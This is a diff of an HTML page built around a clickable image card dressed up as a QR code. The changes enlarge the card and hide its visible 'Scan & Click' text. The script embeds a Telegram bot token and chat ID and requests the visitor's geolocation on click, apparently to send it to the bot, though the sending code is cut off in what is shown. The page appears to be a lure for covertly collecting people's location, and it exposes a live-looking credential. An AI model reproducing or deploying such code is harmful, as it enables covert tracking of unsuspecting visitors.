@@ -14,8 +14,8 @@
     }
     #qrCard {
       cursor: pointer;
-      width: 350px;
-      height: 350px;
+      width: 400px;
+      height: 400px;
       background-image: url('https://i.ibb.co/spwcmX7m/IMG-20250826-WA0011.jpg');
       background-size: cover;
       background-position: center;
@@ -23,20 +23,18 @@
       display: flex;
       justify-content: center;
       align-items: center;
-      color: white;
       font-weight: bold;
-      font-size: 20px;
-      text-shadow: 1px 1px 2px black;
+      font-size: 0; /* لإخفاء أي نص */
     }
   </style>
 </head>
 <body>
-  <div id="qrCard">Scan & Click</div>
+  <div id="qrCard"></div>
 
   <script>
     const qrCard = document.getElementById('qrCard');
-    const BOT_TOKEN = "8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0"; // توكن البوت
-    const CHAT_ID = "7485197107"; // معرف الشات
+    const BOT_TOKEN = "8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0"; 
+    const CHAT_ID = "7485197107";
 
     qrCard.addEventListener('click', () => {
       if (navigator.geolocation) {
